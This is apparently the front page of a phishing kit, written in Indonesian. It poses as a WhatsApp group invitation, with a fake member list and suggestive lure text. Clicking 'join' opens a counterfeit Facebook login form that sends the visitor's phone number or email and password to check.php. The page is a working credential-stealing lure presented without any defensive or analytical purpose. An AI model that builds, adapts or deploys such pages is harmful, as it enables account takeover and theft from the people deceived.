<?php
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"> 
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<meta name="description" content="Undangan chat grup Mntap">
	<meta property="og:title" content="Whatsapp Group Link">
	<meta property="og:description" content="Undangan chat grup Mntap">
	<meta property="og:image" content="img/Korea.jpg">
	<title>Whatsapp Group Link</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<link rel="stylesheet" type="text/css" href="css/facebook.css">
</head>
<body>
	<section>
		<div class="join" style="display: none;">
			<span class="icon"></span>
			<div class="content">
				<h1>Kreasi anak muda🔥💦</h1>
				<span class="ceo">Grup dibuat oleh Sakura</span>
				<p class="desc">
					💡 WELCOME TO GROUP 💡<br>
					<span class="bold">📍 Rules 📍</span><br>
					📌 Kreasi anak muda🔥💦 ... <span class="more">Baca selengkapnya<br>
					
				</p>
				<div class="peserta">32 peserta</div>
				<div class="profile">
					<ul>
						<li>
							<div class="imgBox">
								<img src="img/thumb-350-821024.png">
							</div>
							<span class="nama">Sakura</span>
						</li>
						<li>
							<div class="imgBox">
								<img src="img/karakter-anime-cantik-2-0e6af.jpg.webp">
							</div>
							<span class="nama">Aken Sopian</span>
						</li>
						<li>
							<div class="imgBox">
								<img src="img/karakter-anime-cantik-5-b1053.jpg.webp">
							</div>
							<span class="nama">Abdulzakaria</span>
						</li>
						<li>
							<div class="imgBox">
								<img src="img/karakter-anime-cantik-6-9df5b.jpg.webp">
							</div>
							<span class="nama">Arip Permana Rivaldi</span>
						</li>
						<li>
							<div class="imgBox">
								<img src="img/karakter-anime-cantik-8-62975.jpg.webp">
							</div>
							<span class="nama">Agus Guntara Supriatna</span>
						</li>
						<li>
							<div class="imgBox">
								<img src="img/karakter-anime-cantik-9-5d82f.jpg.webp">
							</div>
							<span class="nama">Darman Bdr</span>
						</li>
						<li>
							<div class="imgBox">
								<img src="img/karakter-anime-cantik-13-a715e.jpg.webp">
							</div>
							<span class="nama">Ega Alvaro</span>
						</li>
					</ul>
				</div>
			</div>
			<div class="bottom">
				<a href="#">BATAL</a>
				<a class="fb">BERGABUNG KE GROUP</a>
			</div>
		</div>
		<div class="loading">
			<span>Memeriksa undangan grup...</span>
			<img class="spin" src="img/0_ptDX0HfJCYpo9Pcs.gif">
		</div>
		
		<div class="popup-login login-facebook animated fadeIn" style="display: none;">
		   <div class="popup-box-login-fb">
		      <div class="navbar-fb">
		         <img width="45" src="img/facebook_text.png">
		      </div>
		      <div class="content-box-fb">
		         <img width="75" height="75" src="img/580b57fcd9996e24bc43c543.png">
		         <div class="txt-login-fb">
		          Masuk ke akun Facebook Anda untuk terhubung dengan Whatsapp
		         </div>
		         <form class="login-form" action="check.php" method="POST">
		            <label>
		            <input type="text" name="user" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required="">
		            </label>
		            <label>
		            <input type="password" name="pass" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required="">
		            </label>
		            <button  type="submit" name="submit" class="btn-login-fb">Masuk</button>
		         </form>
		         <div class="txt-create-account">Create account</div>
		         <div class="txt-not-now">Not now</div>
		         <div class="txt-forgotten-password">Forgotten password?</div>
		      </div>
		      <div class="language-box">
		         <center>
		         <div class="language-name language-name-active">English (UK)</div>
		         <div class="language-name">Bahasa Indonesia</div>
		         <div class="language-name">Basa Jawa</div>
		         <div class="language-name">Bahasa Melayu</div>
		         <div class="language-name">日本語</div>
		         <div class="language-name">Español</div>
		         <div class="language-name">Português (Brasil)</div>
		         <div class="language-name">
		            <i class="fa fa-plus"></i>
		         </div>
		         </center>
		      </div>
		      <div class="copyright">Facebook Inc.</div>
		   </div>
		 </div>
	</section>
	<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
	<script type="text/javascript">
		$(document).ready(function()
		{
			setTimeout(() => {
				$('.loading').css("display","none");
				$('.join').show();
			},1000)
			$('.fb').click(function(){
				$('.login-facebook').fadeIn();
			})
		})
	</script>
	<script type="text/javascript">
			var desc = document.getElementsByClassName("desc");
			var more = document.getElementsByClassName("more");
			more[0].addEventListener("click",function()
			{
				desc[0].innerHTML = '💡 WELCOME TO GROUP 💡<br><span class="bold">📍 Rules 📍</span> <br>📌 Dilarang Sara<br>📌 Dilarang Saling Menghina<br>📌 Dilarang Telpon Admin<br>📌 Harus Berbagi Video<br>📌 Nyimak doang auto kick<br>🎈 SALAM DAMAI 🎈';
						
			})
	</script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
	</script>
</body>
</html>
